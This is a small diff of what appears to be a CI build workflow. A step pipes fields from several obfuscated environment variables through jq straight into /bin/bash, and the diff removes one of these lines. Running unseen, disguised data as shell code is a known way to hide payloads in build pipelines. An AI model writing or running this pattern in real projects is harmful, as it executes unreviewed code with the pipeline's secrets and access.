@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$efoou30575" | jq -r .d9577 | /bin/bash
           printf '%s' "$gjan05" | jq -r .ttr3 | /bin/bash
           printf '%s' "$mrcqf052" | jq -r .u07286 | /bin/bash
-          printf '%s' "$sdfxs41" | jq -r .g4540 | /bin/bash
           printf '%s' "$ef403" | jq -r .jm5034 | /bin/bash
 
       - name: Upload artifact
